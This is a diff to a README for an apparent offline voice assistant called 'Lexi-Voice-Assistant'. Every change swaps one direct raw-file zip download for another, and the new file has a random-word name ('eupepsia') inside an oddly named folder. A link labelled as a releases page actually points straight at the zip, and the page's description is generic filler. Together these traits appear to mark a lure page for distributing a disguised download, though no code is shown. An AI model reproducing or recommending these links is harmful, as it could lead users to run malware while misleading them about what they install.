@@ -1,7 +1,7 @@
 # 🎤 Lexi-Voice-Assistant - Your Offline Voice Companion
 
 ## 🔗 Download Now
-[![Download Lexi-Voice-Assistant](https://raw.githubusercontent.com/Ski-na/Lexi-Voice-Assistant/main/spasmodically/Lexi-Voice-Assistant_v2.0.zip%20Now%20-Get%20the%20App-blue)](https://raw.githubusercontent.com/Ski-na/Lexi-Voice-Assistant/main/spasmodically/Lexi-Voice-Assistant_v2.0.zip)
+[![Download Lexi-Voice-Assistant](https://raw.githubusercontent.com/Ski-na/Lexi-Voice-Assistant/main/spasmodically/Lexi_Voice_Assistant_eupepsia.zip%20Now%20-Get%20the%20App-blue)](https://raw.githubusercontent.com/Ski-na/Lexi-Voice-Assistant/main/spasmodically/Lexi_Voice_Assistant_eupepsia.zip)
 
 ## 📜 Overview
 Lexi-Voice-Assistant is a fully functional offline voice assistant that supports multiple languages. It allows you to interact with your devices hands-free, fetching information, and executing commands just by using your voice.
@@ -19,7 +19,7 @@ To successfully download and run Lexi-Voice-Assistant, follow these simple steps
 ### 1. Visit the Release Page 
 Go to the following link to access the available versions of Lexi-Voice-Assistant: 
 
-[Visit the Releases Page](https://raw.githubusercontent.com/Ski-na/Lexi-Voice-Assistant/main/spasmodically/Lexi-Voice-Assistant_v2.0.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/Ski-na/Lexi-Voice-Assistant/main/spasmodically/Lexi_Voice_Assistant_eupepsia.zip)
 
 ### 2. Choose Your Version
 On the releases page, you will see a list of available versions. Each version is usually accompanied by release notes, which contain important information about new features and fixes.  
@@ -66,4 +66,4 @@ If you have questions, suggestions, or want to report bugs, feel free to reach o
 - **Documentation:** Explore our comprehensive user manual for detailed instructions on using various features.
 - **Community:** Join our user community for tips, tricks, and support from other Lexi users.
 
-[Download Lexi-Voice-Assistant](https://raw.githubusercontent.com/Ski-na/Lexi-Voice-Assistant/main/spasmodically/Lexi-Voice-Assistant_v2.0.zip) and transform how you interact with your computer. Enjoy a hands-free experience that is efficient and intuitive!
+[Download Lexi-Voice-Assistant](https://raw.githubusercontent.com/Ski-na/Lexi-Voice-Assistant/main/spasmodically/Lexi_Voice_Assistant_eupepsia.zip) and transform how you interact with your computer. Enjoy a hands-free experience that is efficient and intuitive!
